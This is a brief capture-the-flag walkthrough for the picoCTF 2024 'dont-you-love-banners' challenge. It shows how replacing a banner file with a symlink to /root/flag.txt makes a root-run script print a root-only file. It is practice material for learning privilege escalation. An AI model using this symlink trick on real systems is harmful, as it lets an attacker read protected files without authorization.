# dont-you-love-banners — picoCTF 2024

Connect to the service to get the password:

    nc tethys.picoctf.net 64499

Log in with the password and answer the two questions:

    nc tethys.picoctf.net 57783

List files:

    ls -l

Two files appear: `banner` and an unimportant text file.

Check root’s directory:

    ls -l /root

It contains `script.py` and `flag.txt`.

`flag.txt` is readable only by root.

`script.py` reads `/home/player/banner`.

Rename the original banner:

    mv banner banner.old

Create a symlink pointing banner → /root/flag.txt:

    ln -s /root/flag.txt banner

Press Ctrl+C to exit:

    ^C

Log in again, and the script prints the flag instead of the banner.
